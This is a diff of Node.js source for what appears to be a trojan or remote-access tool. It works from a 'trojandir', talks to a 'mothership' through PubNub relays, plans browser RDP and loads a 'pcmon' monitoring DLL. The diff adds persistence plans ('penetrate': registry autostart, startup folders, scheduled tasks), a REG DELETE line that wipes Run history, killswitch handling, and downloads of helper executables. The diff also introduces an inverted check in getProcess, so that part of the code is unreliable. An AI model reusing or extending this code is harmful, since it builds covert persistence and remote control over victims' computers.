@@ -8,11 +8,10 @@ debugger;
 
 // https://onecompiler.com/nodejs#draft-yf7t
 
-// IMPLEMENT
 // TODO
-// TEST
-// REVIEW
+// !TEST!
 // anchor
+
 const path = require("path");
 module.paths.push(
     path.resolve(
@@ -32,28 +31,34 @@ const util = require("util");
 const ISDEBUG = true;
 
 // { CommandLine:'...', Name:'...', ProcessId:'...' }
-var processlist = initProcessList();
+var processlist = null; 
+
+initProcessList()
+.then((result) => {
+    initProcessList();
+    processlist = result;
+})
+.catch((err) => {
+    logmsg(err);
+});
+
+// --- TESTING LIST ---
+// test vbs, bat, ps1 script job execution (EXEC_VBS, EXEC_BAT, EXEC_PS1 as well as execute_cmdlist method)
 
 // --- TASKS LIST ---
 
-// ! improve logging / logmsg
+// ! startup: penetrate --> register autostart in registry, folder locations + register tasks // anchor
 
-// ! BUG: execjob script must terminate upon completion --> when finished should exit process
+// ! improve logging / logmsg
+// !! improve mothership logging
+// ! implement exception handling
+// ! modify noderelay to handle browser rdp
 // ! read/write/parse/retrieve config
 
-// TODO: retrieve pslist.exe and use it to grab process names -- need to upgrade isCmdRunning
-//       to inspect the process name as well as pid
-
-// Get-WmiObject Win32_Process | Select-Object ProcessID, Name, CommandLine | Format-List
-// wmic process get ProcessId,Name,CommandLine /format:csv
-// nircmdc
-// ! tasklist is very slow, powershell is also slow
+// ! BUG: execjob script must terminate upon completion --> when finished should exit process
 
 // ! creating/deleting/query tasks and registry not natively supported by node, have to implement
 // bat/cmd, ps1, vbs failover
-
-// EXEC_CMD --> StartPCMon, StopPCMon
-//              StartPSPCmon, StopPSPCmon
 
 // EXEC_CMD --> GetSystemOverview
 //              GetTrojanDir
@@ -464,6 +469,7 @@ class CmdConfig {
         relay: relay,
         install_python: install_python,
         install_node: install_node,
+        cleanup: cleanup
     };
 
     get dynamicdelay() {
@@ -495,8 +501,6 @@ class CmdConfig {
 
         if (!exitparent) exitparent = false;
 
-        let execlaunch = false;
-
         let tcmdpid = this.readcmdpid();
 
         if (tcmdpid <= 0) {
@@ -515,16 +519,19 @@ class CmdConfig {
 
         let cmdprocess = getProcess(tcmdpid);
         let procname = cmdprocess ? cmdprocess.Name.toLowerCase() : "UNKNOWN";
+        procname = path.basename(procname);
 
         if (ispidalive) {
-            if (cmdprocess && !procname.includes(this.launchprocname)) {
-                this.launch(cmdlineargs, exitparent);
-                logmsg("finished");
-                return;
+            if (cmdprocess) {
+                let tlaunchprocname = path.basename(this.launchprocname);
+                if ( ! procname.includes(tlaunchprocname) ) { // !TEST!
+                    this.launch(cmdlineargs, exitparent);
+                    logmsg("finished");
+                    return;
+                }
             }
         }
 
-        // procname = 'node.exe'
         logmsg(
             `finished -- no need to launch -- [${this.cmdname}] cmd is running with pid=${tcmdpid} process name=${procname}`
         );
@@ -533,6 +540,7 @@ class CmdConfig {
     }
 
     // message handler -- used by parent cmds to process incoming messages from child cmds
+    // should be overriden
     // parent cmd will have a pointer for each child cmd, each child cmd...
     // (e.g., watchdog relays messages from ping to cmdlist)
     // ... relay messages between ping and cmdlist
@@ -668,10 +676,22 @@ class CmdConfig {
         return child;
     }
 
-    // TODO
     exitramp() {
-        // killall --> exit without deleting
-        // reset_ & tcmdname & loop --> delete then exit
+        let fpath = path.join(systemstate.trojandir, 'killall');
+
+        if ( fileExists(fpath) ) {
+            logmsg('found killall -- exiting');
+            process.exit(0);
+            return;
+        }
+
+        fpath = path.join(systemstate.trojandir, 'reset_' + systemstate.cmdconfig.cmdname );
+
+        if ( fileExists(fpath) ) {
+            rmSync(fpath, { force: true });
+            process.exit(0);
+            return;
+        }
     }
 
     async loop() {
@@ -912,7 +932,7 @@ async function exec_pslist() {
 
     let childp = await invoke_exe(
         "pslist.exe",
-        null,
+        ["-accepteula"],
         systemstate.trojandir,
         (text) => {
             pslisttxt += text;
@@ -1111,10 +1131,12 @@ function getProcess(pid) {
     // Name
     // ProcessId
 
-    if (processlist && processlist.length >= 1) {
-        for (let i = 0; i < processlist.length; i++) {
-            if (processlist[i].ProcessId == pid) return processlist[i];
-        }
+    if (!processlist || processlist.length >= 1) {
+        return null;
+    }
+
+    for (let i = 0; i < processlist.length; i++) {
+        if (processlist[i].ProcessId == pid) return processlist[i];
     }
 
     return null;
@@ -2332,7 +2354,7 @@ function launchrelay(tenginename, tpubnubr, browsername) {
     logmsg(`launching: ${tenginename}, ${tpubnubr}, ${browsername}`);
 
     if (tenginename == "JS") {
-        tchildp = runnoderelay(tpubnubr);
+        tchildp = runnoderelay(tpubnubr); // TODO modify to include browsername // anchor
     } else if (tenginename == "BAT") {
         tchildp = runbatrelay(tpubnubr);
     } else if (tenginename == "PS1") {
@@ -2380,15 +2402,16 @@ function relay() {
     let browsername = enginename == "PY" && args?.length > 1 ? args[1] : null;
 
     if (isNullOrWhitespace(enginename)) {
-        throw new Error("cmdname must be StartRelay");
+        throw new Error("enginename is missing");
     }
 
-    if (!["BAT", "PS1", "JS", "PY"].includes(enginename)) {
+    if (!["BAT", "PS1", "JS", "PY"].includes(enginename.toUpperCase())) {
         throw new Error("enginename not supported: " + enginename);
     }
 
     let pubnubr = null;
 
+    // python relay uses its own pubnub logic within the python script (pythonrelay.py)
     if (enginename != "PY") {
         relaycmd.pubnubrelay = new PubnubRelay(enginename);
 
@@ -2661,11 +2684,15 @@ function cmdlist() {
     logmsg("finished");
 }
 
+// TODO
+function reschedule() {
+    // check if tasks have been scheduled
+}
+
+// TODO -- missing implementation
 function penetrate() {
     logmsg("starting");
-
-    logmsg("finished");
-    process.exit(0);
+    
 
     // modify registry for startup items
     // copy exe/scripts to startup folders
@@ -2695,7 +2722,10 @@ cmdstr = "REG DELETE HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Run
     // schedule tasks
 
     // delete entries in windows run box
-    // cleanup
+    // cleanup -- only call if trojandir is full
+ 
+    logmsg("finished");
+    process.exit(0);
 }
 
 async function invoke_exe(
@@ -3236,6 +3266,9 @@ async function retrieve() {
         "nircmdc.exe",
         "7za.exe",
         "gunite.exe",
+        "pcmon.dll",
+        "pcmon.exe", 
+        "pslist.exe"
     ];
 
     for (let i = 0; i < assets.length; i++) {
@@ -3268,16 +3301,24 @@ function cleanup() {
     // check if trojandir has hit limits, then execute cleanup
     // remove log files, etc.
     // remove cmdlist_ directories
+
+    //   rmSync('./path/to/dir', { recursive: true, force: true });
+    //   fs.unlinkSync('./path/to/file.txt');
+
+    // *.json
+    // *.log
 }
 
 function launch_pcmon_koffi() {
     const koffi = require('koffi');
 
-    let dllpath = path.join(systemstate.trojandir, 'pcmon.dll');
+    let dllpath = path.join(systemstate.pcmondir, 'pcmon.dll');
 
     if ( ! fileExists(dllpath) ) {
         throw new Error('dll does not exist '+dllpath);
     }
+
+    process.chdir(systemstate.pcmondir);
 
     const lib = koffi.load(dllpath);
     const pcmon_func = lib.func('__stdcall', 'pcmon_main', 'int', []);
